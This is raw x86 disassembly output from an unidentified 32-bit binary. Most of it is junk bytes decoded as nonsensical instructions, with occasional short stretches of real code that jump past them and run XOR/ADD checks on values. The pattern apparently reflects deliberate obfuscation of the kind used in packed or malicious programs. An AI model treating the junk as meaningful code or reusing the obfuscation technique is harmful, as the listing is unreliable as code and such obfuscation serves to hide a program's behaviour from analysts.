  40f1c1:	fistp  QWORD PTR [edx+0x77]
  40f1c4:	(bad)  
  40f1c5:	loope  0x40f21f
  40f1c7:	push   edx
  40f1c8:	dec    edi
  40f1c9:	scas   eax,DWORD PTR es:[edi]
  40f1ca:	sub    DWORD PTR [ecx-0x22b9804a],edi
  40f1d0:	(bad)  
  40f1d1:	xchg   esp,eax
  40f1d2:	sbb    BYTE PTR [edx-0x3a641b31],0x9a
  40f1d9:	jnp    0x40f177
  40f1db:	cmp    al,0x95
  40f1dd:	push   ebx
  40f1de:	outs   dx,DWORD PTR ds:[esi]
  40f1df:	inc    ebx
  40f1e0:	js     0x40f1c8
  40f1e2:	cmp    eax,0xac92ae57
  40f1e7:	xchg   ebx,eax
  40f1e8:	add    bh,BYTE PTR [edx]
  40f1ea:	fwait
  40f1eb:	cmp    esp,DWORD PTR [eax-0x1c]
  40f1ee:	mov    dl,0x24
  40f1f0:	lea    ebp,[edx]
  40f1f2:	popa   
  40f1f3:	mov    BYTE PTR [ebp+0x6640028c],0x8
  40f1fa:	push   ecx
  40f1fb:	mov    bh,0xf3
  40f1fd:	mov    BYTE PTR [ecx-0x62],dl
  40f200:	xchg   esp,eax
  40f201:	sbb    DWORD PTR [edi+0x2e],esi
  40f204:	nop
  40f205:	mov    ds:0x2f17cc86,al
  40f20a:	cmc    
  40f20b:	xchg   edi,eax
  40f20c:	es mov esi,0xe50892b0
  40f212:	add    BYTE PTR [edi],ah
  40f214:	aam    0x55
  40f216:	mov    DWORD PTR [edx-0x18],edx
  40f219:	xor    ebx,esi
  40f21b:	inc    ecx
  40f21c:	pop    edx
  40f21d:	push   0x1f430fd1
  40f222:	add    al,0x3e
  40f224:	bound  edi,QWORD PTR [ebx-0x23]
  40f227:	int    0xbc
  40f229:	loopne 0x40f1b8
  40f22b:	jge    0x40f24f
  40f22d:	ins    DWORD PTR es:[edi],dx
  40f22e:	cld    
  40f22f:	(bad)  
  40f231:	loope  0x40f244
  40f233:	push   edx
  40f234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f235:	jno    0x40f288
  40f237:	pusha  
  40f238:	cmc    
  40f239:	xor    esi,DWORD PTR [ebp-0x60]
  40f23c:	stos   DWORD PTR es:[edi],eax
  40f23d:	dec    edi
  40f23e:	sbb    DWORD PTR [ebx+0x647b8a56],eax
  40f244:	mov    ebx,0x38d12372
  40f249:	into   
  40f24a:	in     eax,dx
  40f24b:	or     BYTE PTR [ecx],0x7b
  40f24e:	sbb    DWORD PTR [esi+0x3],edi
  40f251:	je     0x40f2b4
  40f253:	inc    ebp
  40f254:	lds    edx,FWORD PTR ds:0x1d6ada47
  40f25a:	cmp    ecx,DWORD PTR [eax-0x3ab1786a]
  40f260:	xchg   edx,eax
  40f261:	xor    al,0x99
  40f263:	push   0xc5a0a23
  40f268:	fstp   TBYTE PTR [esi-0x7f]
  40f26b:	test   al,0x3
  40f26d:	div    BYTE PTR [eax]
  40f26f:	icebp  
  40f270:	or     dh,BYTE PTR fs:[ebp-0x2]
  40f274:	sahf   
  40f275:	lahf   
  40f276:	add    eax,esi
  40f278:	mov    ch,BYTE PTR [eax+0x587b2899]
  40f27e:	mov    ch,0xd1
  40f280:	mov    bh,0xe9
  40f282:	jnp    0x40f2ac
  40f284:	(bad)  
  40f285:	out    dx,al
  40f286:	jbe    0x40f2a6
  40f288:	and    BYTE PTR [edx*1+0x131a2996],0xab
  40f290:	or     dh,BYTE PTR [eax-0x7b]
  40f293:	jmp    0x40f277
  40f295:	push   0xa
  40f297:	jge    0x40f25c
  40f299:	inc    ecx
  40f29a:	int    0xc8
  40f29c:	int3   
  40f29d:	stos   DWORD PTR es:[edi],eax
  40f29e:	or     BYTE PTR [ecx-0x2701d176],dl
  40f2a4:	(bad)  
  40f2a6:	push   ss
  40f2a7:	jmp    FWORD PTR [edx-0x78]
  40f2aa:	out    dx,al
  40f2ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2ac:	out    0x6,al
  40f2ae:	in     eax,dx
  40f2af:	cmp    al,BYTE PTR [esi+0x26]
  40f2b2:	mov    eax,0x4e0144af
  40f2b7:	sub    al,0x29
  40f2b9:	in     al,0x58
  40f2bb:	xchg   ch,ah
  40f2bd:	(bad)  
  40f2be:	fsubr  QWORD PTR cs:[esi]
  40f2c1:	ins    BYTE PTR es:[edi],dx
  40f2c2:	dec    esi
  40f2c3:	sub    al,BYTE PTR [ebx-0x76ff3806]
  40f2c9:	push   ds
  40f2ca:	xor    al,0x60
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rcl    BYTE PTR [ebp+eax*4-0x29],1
  40f2fa:	and    DWORD PTR [esi-0x57],esi
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f34b
  40f304:	sub    BYTE PTR [ebp-0x3a],dl
  40f307:	ins    BYTE PTR es:[edi],dx
  40f308:	mul    BYTE PTR [ebx]
  40f30a:	(bad)  
  40f30b:	inc    esi
  40f30c:	jg     0x40f29b
  40f30e:	iret   
  40f30f:	stc    
  40f310:	and    eax,0x98264626
  40f315:	mov    DWORD PTR [esi-0x6a83b1ed],esi
  40f31b:	xor    DWORD PTR ds:0x2b390876,edi
  40f321:	sbb    eax,0x5cc9fe88
  40f326:	sar    bh,1
  40f328:	sbb    al,0x13
  40f32a:	add    eax,0x6c1cf4ee
  40f32f:	call   0x93ab:0xebea2d95
  40f336:	push   esp
  40f337:	rol    BYTE PTR [ecx+ebx*1],1
  40f33a:	loop   0x40f389
  40f33c:	loop   0x40f377
  40f33e:	and    BYTE PTR [edi-0x4087aa5e],cl
  40f344:	jae    0x40f357
  40f346:	xchg   ebp,eax
  40f347:	aam    0xb2
  40f349:	into   
  40f34a:	stc    
  40f34b:	sub    ah,dh
  40f34d:	in     eax,dx
  40f34e:	pop    ebp
  40f34f:	adc    al,0xf
  40f351:	lods   al,BYTE PTR ds:[esi]
  40f352:	xchg   esi,eax
  40f353:	scas   al,BYTE PTR es:[edi]
  40f354:	iret   
  40f355:	xor    al,BYTE PTR [edi+0x0]
  40f358:	js     0x40f316
  40f35a:	icebp  
  40f35b:	mov    ebp,0xd7024dc9
  40f360:	int    0xbc
  40f362:	sub    al,0x27
  40f364:	cmp    BYTE PTR [edi+0xec0c2b5],al
  40f36a:	test   al,0x6b
  40f36c:	int    0xd0
  40f36e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f36f:	add    BYTE PTR [edi+0x3c],bl
  40f372:	or     eax,0x8906b4ff
  40f377:	(bad)  
  40f378:	mov    cl,0x49
  40f37a:	pop    edi
  40f37b:	cmp    BYTE PTR [esp+ebp*2],bl
  40f37e:	mov    WORD PTR [ebx+edx*1+0x7b],gs
  40f382:	sub    eax,DWORD PTR [edi+0x42]
  40f385:	jne    0x40f324
  40f387:	into   
  40f388:	out    0xe3,eax
  40f38a:	xchg   edx,eax
  40f38b:	sbb    esi,DWORD PTR [edx+ecx*4-0x6c7e4c99]
  40f392:	shl    DWORD PTR [eax+eiz*4-0x224541b4],0x74
  40f39a:	shr    DWORD PTR [eax+0x52d88986],1
  40f3a0:	or     al,0xde
  40f3a2:	add    edi,DWORD PTR [edx-0x18d52de5]
  40f3a8:	int    0xc2
  40f3aa:	jmp    0x40f369
  40f3ac:	test   DWORD PTR [ecx+edi*2-0x1b],ebp
  40f3b0:	mov    edx,0xb8dbc532
  40f3b5:	pop    esi
  40f3b6:	stc    
  40f3b7:	das    
  40f3b8:	shl    DWORD PTR [esi-0xc],cl
  40f3bb:	or     DWORD PTR [ebp+0x1e],0x85f5521a
  40f3c2:	and    DWORD PTR [edi-0x445548b6],ebp
  40f3c8:	and    dh,BYTE PTR [eax-0x29]
  40f3cb:	or     eax,0x419e51d2
  40f3d0:	add    BYTE PTR [ecx+eiz*4-0x73ef8807],cl
  40f3d7:	cld    
  40f3d8:	mov    DWORD PTR [eax],esp
  40f3da:	pop    ebp
  40f3db:	icebp  
  40f3dc:	into   
  40f3dd:	aaa    
  40f3de:	pop    ebp
  40f3df:	outs   dx,DWORD PTR ds:[esi]
  40f3e0:	and    ch,bl
  40f3e2:	xchg   ebp,eax
  40f3e3:	popa   
  40f3e4:	leave  
  40f3e5:	inc    ebx
  40f3e6:	hlt    
  40f3e7:	inc    ebx
  40f3e8:	jno    0x40f3d3
  40f3ea:	mov    ebx,0xa026197c
  40f3ef:	add    DWORD PTR [ebx+0x6d],esp
  40f3f2:	imul   esi,DWORD PTR [edx],0xe365ed9
  40f3f8:	dec    ebx
  40f3f9:	in     al,0xc
  40f3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3fc:	add    bl,dl
  40f3fe:	dec    ebx
  40f3ff:	fnstsw WORD PTR [ecx]
  40f401:	cld    
  40f402:	adc    al,0x97
  40f404:	out    dx,eax
  40f405:	add    ah,0x84
  40f408:	out    dx,eax
  40f409:	add    eax,0x132bf10f
  40f40e:	lahf   
  40f40f:	and    al,0x8e
  40f411:	daa    
  40f412:	test   BYTE PTR [edi+ecx*1],ch
  40f415:	cmp    BYTE PTR [edi],cl
  40f417:	or     BYTE PTR [ebp+0x4a],cl
  40f41a:	mov    WORD PTR [ecx+eiz*2+0x76],gs
  40f41e:	and    eax,0x9d040f7e
  40f423:	push   es
  40f424:	mov    al,0xf8
  40f426:	jecxz  0x40f49c
  40f428:	dec    esi
  40f429:	adc    BYTE PTR [edi-0x4b],0xb9
  40f42d:	(bad)  
  40f42e:	imul   ebp,DWORD PTR [esi-0xe7ca478],0xffffffb2
  40f435:	or     DWORD PTR [esi+0x43],0xffffff96
  40f439:	fstp   QWORD PTR [ecx]
  40f43b:	in     eax,0xd5
  40f43d:	popa   
  40f43e:	sub    eax,0xd668a712
  40f443:	fsub   DWORD PTR [ecx+0x7b]
  40f446:	inc    ecx
  40f447:	enter  0x5be8,0x39
  40f44b:	fs mov ch,0xa
  40f44e:	mov    ebx,0xf8458b8d
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	add    cl,cl
  40f466:	mov    dl,BYTE PTR [edx]
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	test   al,0x53
  40f472:	adc    al,0x38
  40f474:	cmp    BYTE PTR [ecx-0x36b8e54d],0x57
  40f47b:	cs xchg edx,eax
  40f47d:	out    0x5a,al
  40f47f:	ds jae 0x40f456
  40f482:	and    eax,DWORD PTR [edi+0xcfa8d6b]
  40f488:	dec    edi
  40f489:	add    DWORD PTR [ecx],0x667ec109
  40f48f:	mov    ah,0x20
  40f491:	in     eax,dx
  40f492:	xchg   ebx,eax
  40f493:	idiv   DWORD PTR [ecx-0x1124a789]
  40f499:	mov    ch,0x62
  40f49b:	stos   DWORD PTR es:[edi],eax
  40f49c:	xor    eax,DWORD PTR [esi+ecx*1]
  40f49f:	or     DWORD PTR [esi-0x274cf676],ebx
  40f4a5:	pushf  
  40f4a6:	repz mov ebx,0xe2ac76a
  40f4ac:	add    ecx,DWORD PTR ds:0x1d224222
  40f4b2:	pop    edi
  40f4b3:	cmp    ch,al
  40f4b5:	adc    esi,DWORD PTR [edi+0x20]
  40f4b8:	mov    DWORD PTR [edi],ebp
  40f4ba:	nop
  40f4bb:	jp     0x40f4ab
  40f4bd:	stos   DWORD PTR es:[edi],eax
  40f4be:	inc    edx
  40f4bf:	xchg   esi,eax
  40f4c0:	shr    BYTE PTR [ebp-0x7d],cl
  40f4c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4c4:	mov    ah,0x65
  40f4c6:	ret    
  40f4c7:	xlat   BYTE PTR ds:[ebx]
  40f4c8:	es in  eax,dx
  40f4ca:	addr16 test al,0xb1
  40f4cd:	sbb    eax,0x9fbd86bd
  40f4d2:	fiadd  DWORD PTR [ebx-0x70]
  40f4d5:	aas    
  40f4d6:	mov    edx,0x5c4cebab
  40f4db:	clc    
  40f4dc:	mov    ah,0xcf
  40f4de:	bnd jno 0x40f520
  40f4e1:	das    
  40f4e2:	retf   
  40f4e3:	ficom  WORD PTR [edx-0x5cbc8b0a]
  40f4e9:	fadd   st,st(4)
  40f4eb:	aaa    
  40f4ec:	loopne 0x40f567
  40f4ee:	xchg   BYTE PTR [ecx+0x30],al
  40f4f1:	push   edx
  40f4f2:	test   eax,0x14320288
  40f4f7:	daa    
  40f4f8:	out    0xa8,al
  40f4fa:	(bad)  
  40f4fb:	adc    bh,cl
  40f4fd:	jp     0x40f501
  40f4ff:	mov    esi,0xc5a502c2
  40f504:	jns    0x40f50d
  40f506:	ins    DWORD PTR es:[edi],dx
  40f507:	and    ah,BYTE PTR [ebx-0x2c]
  40f50a:	or     BYTE PTR [ebx],ah
  40f50c:	mov    esi,DWORD PTR [esp+ebx*2+0x6da9156d]
  40f513:	lds    ebx,FWORD PTR [eax]
  40f515:	add    eax,DWORD PTR [esi-0x212e758]
  40f51b:	dec    eax
  40f51c:	sbb    bl,BYTE PTR [ecx+eax*2+0x1a]
  40f520:	das    
  40f521:	pusha  
  40f522:	push   ds
  40f523:	inc    ebx
  40f524:	loopne 0x40f57f
  40f526:	jmp    0xf32b:0x5c00523d
  40f52d:	loope  0x40f594
  40f52f:	scas   al,BYTE PTR es:[edi]
  40f530:	sar    DWORD PTR [ecx],0x83
  40f533:	mov    cl,0x14
  40f535:	pop    esp
  40f536:	into   
  40f537:	les    ebx,FWORD PTR [esp+edx*2+0x253ce875]
  40f53e:	ret    
  40f53f:	jns    0x40f59f
  40f541:	fdiv   QWORD PTR [eax+esi*8]
  40f544:	and    DWORD PTR [ecx],esp
  40f546:	stos   DWORD PTR es:[edi],eax
  40f547:	pop    ss
  40f548:	je     0x40f586
  40f54a:	sti    
  40f54b:	loop   0x40f4f8
  40f54d:	stos   BYTE PTR es:[edi],al
  40f54e:	and    esp,ecx
  40f550:	cwde   
  40f551:	leave  
  40f552:	retf   0xfcea
  40f555:	lahf   
  40f556:	(bad)  
  40f557:	stos   DWORD PTR es:[edi],eax
  40f558:	dec    esi
  40f559:	bound  eax,QWORD PTR [ebx]
  40f55b:	add    eax,0x37ff06ba
  40f560:	dec    edi
  40f561:	sub    ch,BYTE PTR [ebx]
  40f563:	aad    0x19
  40f565:	xchg   esi,eax
  40f566:	popf   
  40f567:	xlat   BYTE PTR ds:[ebx]
  40f568:	hlt    
  40f569:	add    cl,BYTE PTR [eax+0x4c]
  40f56c:	inc    edx
  40f56d:	test   ah,bl
  40f56f:	(bad)  
  40f570:	pop    ds
  40f571:	mov    ebp,0x6cd37e7f
  40f576:	fs and eax,0x24ce0ddf
  40f57c:	inc    edx
  40f57d:	jp     0x40f527
  40f57f:	loopne 0x40f5e6
  40f581:	dec    edx
  40f582:	fdiv   st,st(4)
  40f584:	cmp    ecx,DWORD PTR [esi+ebx*1+0x368bf9d9]
  40f58b:	xor    bh,bl
  40f58d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f58e:	sbb    eax,0xa89db99b
  40f593:	imul   ebp,DWORD PTR [ebp+0x3540c57e],0xd67b02db
  40f59d:	jg     0x40f5ea
  40f59f:	dec    edx
  40f5a0:	test   eax,0x70a5bcd
  40f5a5:	call   0xb6cb:0xac422a43
  40f5ac:	mov    WORD PTR [edi+0x1e],?
  40f5af:	test   DWORD PTR [ecx],0xca5ee6b6
  40f5b5:	dec    ebx
  40f5b6:	in     al,0xf6
  40f5b8:	xchg   ebx,eax
  40f5b9:	stos   DWORD PTR es:[edi],eax
  40f5ba:	push   ebx
  40f5bb:	test   eax,0x8b008b45
  40f5c0:	inc    eax
  40f5c1:	cmp    al,0x8d
  40f5c3:	or     al,0xcd
  40f5c5:	js     0x40f5c7
  40f5c7:	add    BYTE PTR [eax],al
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	sbb    al,0xc7
  40f605:	mov    eax,DWORD PTR [eax-0x74]
  40f608:	mov    dh,0x70
  40f60a:	jo     0x40f5cf
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f5bd
  40f610:	fsub   QWORD PTR [eax+0x727efef9]
  40f616:	dec    edi
  40f617:	xchg   esp,eax
  40f618:	lods   eax,DWORD PTR ds:[esi]
  40f619:	sub    DWORD PTR [ebp-0x57],0x4a8a6502
  40f620:	mov    DWORD PTR [edx],ebp
  40f622:	push   ss
  40f623:	(bad)  [edi-0x1f]
  40f626:	sub    al,0x8d
  40f628:	jmp    0x8d72d7b2
  40f62d:	stc    
  40f62e:	and    eax,0x4de194d0
  40f633:	data16 (bad) 
  40f636:	fcmovnu st,st(7)
  40f638:	aam    0x10
  40f63a:	popa   
  40f63b:	xor    ch,cl
  40f63d:	shr    BYTE PTR [eax+0x4c],0x65
  40f641:	inc    eax
  40f642:	add    eax,0x57a03a7e
  40f647:	or     edi,DWORD PTR [ebx]
  40f649:	inc    edi
  40f64a:	inc    edx
  40f64b:	pop    eax
  40f64c:	ja     0x40f6be
  40f64e:	xchg   edi,eax
  40f64f:	sub    al,0xf8
  40f651:	retf   0x52f1
  40f654:	inc    esp
  40f655:	mov    esi,0x3268d20b
  40f65a:	hlt    
  40f65b:	inc    eax
  40f65c:	add    BYTE PTR [ecx+0xb],0x2c
  40f660:	pop    ds
  40f661:	aaa    
  40f662:	pop    esi
  40f663:	imul   edi,DWORD PTR [ecx],0x9447c7e6
  40f669:	inc    ebx
  40f66a:	sbb    eax,0x88c255ab
  40f66f:	xor    DWORD PTR [ebp-0x2443c6cb],0xffffff8e
  40f676:	jne    0x40f613
  40f678:	mov    edx,0x7a558843
  40f67d:	xchg   ebx,eax
  40f67e:	aaa    
  40f67f:	or     eax,0xad7db91
  40f684:	mov    al,ds:0x38ae9341
  40f689:	dec    BYTE PTR [edx]
  40f68b:	jp     0x40f66c
  40f68d:	cdq    
  40f68e:	cmp    cl,0x45
  40f691:	loope  0x40f66b
  40f693:	xchg   BYTE PTR [ecx+0x21e8e1f1],dl
  40f699:	mov    ds:0x1fdece97,eax
  40f69e:	test   DWORD PTR [edi],esp
  40f6a0:	mov    dl,0x2a
  40f6a2:	jae    0x40f64d
  40f6a4:	jmp    ebp
  40f6a6:	pop    ss
  40f6a7:	add    al,0x92
  40f6a9:	es inc ecx
  40f6ab:	aad    0x4d
  40f6ad:	aam    0xcc
  40f6af:	ret    
  40f6b0:	inc    eax
  40f6b1:	cdq    
  40f6b2:	out    0x1b,al
  40f6b4:	out    dx,eax
  40f6b5:	xchg   ecx,edi
  40f6b7:	cmp    dh,BYTE PTR [eax+0x1e]
  40f6ba:	and    al,0xb0
  40f6bc:	(bad)  
  40f6bd:	mov    edi,0x7e7b1647
  40f6c2:	pop    ecx
  40f6c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6c4:	stos   DWORD PTR es:[edi],eax
  40f6c5:	imul   ebx,DWORD PTR [esi],0xffffff8f
  40f6c8:	pop    eax
  40f6c9:	out    0x7,al
  40f6cb:	dec    esi
  40f6cc:	mov    ebp,0x17654895
  40f6d1:	pop    es
  40f6d2:	retf   0xef9
  40f6d5:	outs   dx,BYTE PTR es:[esi]
  40f6d7:	dec    esi
  40f6d8:	pop    es
  40f6d9:	repnz scas al,BYTE PTR es:[edi]
  40f6db:	nop
  40f6dc:	push   esi
  40f6dd:	push   es
  40f6de:	or     edi,DWORD PTR [edx+0x39]
  40f6e1:	cbw    
  40f6e3:	lea    ebp,[ebx]
  40f6e5:	int    0x77
  40f6e7:	mov    ah,0x84
  40f6e9:	sub    bh,BYTE PTR [ecx+ebx*2]
  40f6ec:	cld    
  40f6ed:	cmp    esi,ecx
  40f6ef:	(bad)  
  40f6f0:	mov    al,0xd0
  40f6f2:	loop   0x40f6fc
  40f6f4:	adc    bl,BYTE PTR [ebx]
  40f6f6:	sub    dl,BYTE PTR [esi]
  40f6f8:	sbb    al,0x52
  40f6fa:	das    
  40f6fb:	clc    
  40f6fc:	sti    
  40f6fd:	bound  esp,QWORD PTR [esi*2+0x5890f569]
  40f704:	in     eax,dx
  40f705:	pop    ecx
  40f706:	cmp    al,BYTE PTR [ebp+0x7532e7d5]
  40f70c:	(bad)  
  40f70d:	push   edx
  40f70e:	sbb    al,0x5f
  40f710:	inc    esi
  40f711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f712:	push   eax
  40f713:	jne    0x40f758
  40f715:	stc    
  40f716:	mov    esi,0x18fbd3f2
  40f71b:	arpl   WORD PTR [ebx],ax
  40f71d:	jns    0x40f71f
  40f71f:	idiv   DWORD PTR [edi+0x9]
  40f722:	mov    al,ds:0xda2f8b75
  40f727:	test   dl,cl
  40f729:	(bad)  
  40f72a:	out    0x41,al
  40f72c:	xchg   esp,eax
  40f72d:	cdq    
  40f72e:	jle    0x40f6b9
  40f730:	jo     0x40f73c
  40f732:	dec    esp
  40f733:	ins    BYTE PTR es:[edi],dx
  40f734:	(bad)  
  40f736:	push   edx
  40f737:	add    dl,BYTE PTR fs:[ebx]
  40f73a:	xchg   edi,eax
  40f73b:	xchg   edi,eax
  40f73c:	push   es
  40f73d:	mov    eax,0xb0e57a9f
  40f742:	jno    0x40f730
  40f744:	or     eax,0xff0a006b
  40f749:	pop    edi
  40f74a:	cmp    DWORD PTR [eax-0x742755b6],ecx
  40f750:	mov    eax,0xf6f36e8f
  40f755:	pushf  
  40f756:	inc    esi
  40f757:	(bad)  
  40f759:	or     eax,0x458b6509
  40f75e:	clc    
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0xff8546f3
  40f7e3:	mov    ecx,DWORD PTR [esi+0x5f]
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f783
  40f7ee:	or     ch,bl
  40f7f0:	outs   dx,BYTE PTR ds:[esi]
  40f7f1:	push   eax
  40f7f2:	dec    edi
  40f7f3:	sti    
  40f7f4:	out    dx,eax
  40f7f5:	inc    ebp
  40f7f6:	pop    es
  40f7f7:	mov    bl,0x47
  40f7f9:	fild   QWORD PTR [esi]
  40f7fb:	loop   0x40f788
  40f7fd:	push   ds
  40f7fe:	and    al,0xb7
  40f800:	fstp   DWORD PTR [ebp-0x62]
  40f803:	clc    
  40f804:	pop    es
  40f805:	pop    ebx
  40f806:	shr    ch,0x89
  40f809:	out    dx,eax
  40f80a:	fcom   DWORD PTR [edx+eiz*1-0x1f]
  40f80e:	(bad)  
  40f810:	mov    edx,0x2f15f9f0
  40f815:	or     ebp,eax
  40f817:	mov    ds,WORD PTR ss:[eax]
  40f81a:	ret    0x6fd
  40f81d:	mov    ah,al
  40f81f:	mov    bl,0x3d
  40f821:	popf   
  40f822:	hlt    
  40f823:	(bad)  
  40f824:	test   DWORD PTR [edi],ebp
  40f826:	dec    esi
  40f827:	and    dh,BYTE PTR ds:0xd73f4610
  40f82d:	inc    eax
  40f82e:	pop    eax
  40f82f:	int3   
  40f830:	cmp    ebp,0xffffffc4
  40f833:	jns    0x40f83d
  40f835:	pop    eax
  40f836:	loopne 0x40f7f0
  40f838:	or     BYTE PTR [ebx],al
  40f83a:	aas    
  40f83b:	cmp    al,0xaf
  40f83d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f83e:	mov    dh,0x57
  40f840:	adc    al,0x0
  40f842:	mov    esi,0x59c08aa3
  40f847:	adc    BYTE PTR [edx],0x68
  40f84a:	out    0xa6,eax
  40f84c:	mov    cl,0xa0
  40f84e:	mov    WORD PTR [eax+0x6bd4b4ac],cs
  40f854:	mov    bl,0xa2
  40f856:	(bad)  
  40f857:	mov    eax,ds:0x519fd64d
  40f85c:	call   0x6cbe:0x9544885f
  40f863:	or     DWORD PTR [edx-0x7e],edx
  40f866:	push   ebx
  40f867:	lahf   
  40f868:	inc    esi
  40f869:	and    eax,0x6c7cf000
  40f86e:	inc    edi
  40f86f:	push   ecx
  40f870:	xor    ebp,DWORD PTR [ecx-0x65]
  40f873:	mov    eax,0xa00176a5
  40f878:	(bad)  
  40f879:	xlat   BYTE PTR ds:[ebx]
  40f87a:	lods   al,BYTE PTR ds:[esi]
  40f87b:	loop   0x40f8c7
  40f87d:	lods   al,BYTE PTR ds:[esi]
  40f87e:	pop    ecx
  40f87f:	pop    ecx
  40f880:	xchg   edx,eax
  40f881:	xor    al,BYTE PTR [edi]
  40f883:	addr16 dec esi
  40f885:	or     ebx,DWORD PTR [edx+ebx*1+0x35]
  40f889:	cld    
  40f88a:	leave  
  40f88b:	inc    ebp
  40f88c:	dec    edx
  40f88d:	mov    ah,0xf0
  40f88f:	push   ebx
  40f890:	pop    ecx
  40f891:	fsubr  DWORD PTR [edx-0x213d8a6d]
  40f897:	mov    ebp,0xaefe5d4
  40f89c:	inc    edi
  40f89d:	lock fidivr DWORD PTR [esi+0x1f]
  40f8a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8a3:	push   esp
  40f8a4:	les    esp,FWORD PTR [ebx-0x5c]
  40f8a7:	dec    eax
  40f8a9:	loope  0x40f8c9
  40f8ab:	cmc    
  40f8ac:	out    0xad,al
  40f8ae:	push   ss
  40f8af:	cmp    bh,BYTE PTR [ebx-0x4332d2d0]
  40f8b5:	sar    BYTE PTR [edx+ecx*8+0x2c],cl
  40f8b9:	cmp    edi,DWORD PTR [ebp-0x61]
  40f8bc:	mov    dl,0x22
  40f8be:	jne    0x40f927
  40f8c0:	jno    0x40f933
  40f8c2:	into   
  40f8c3:	iret   
  40f8c4:	arpl   WORD PTR [ecx],bx
  40f8c6:	add    al,0x8c
  40f8c8:	cmp    ebx,ecx
  40f8ca:	mov    al,ds:0x8b19b8cd
  40f8cf:	pop    edx
  40f8d0:	lahf   
  40f8d1:	and    eax,0xd0adf43b
  40f8d6:	ret    0x5e8d
  40f8d9:	xor    DWORD PTR [ecx],esi
  40f8db:	mov    eax,0x5ca2d630
  40f8e0:	retf   
  40f8e1:	jno    0x40f863
  40f8e3:	std    
  40f8e4:	fdiv   DWORD PTR [eax-0x4c]
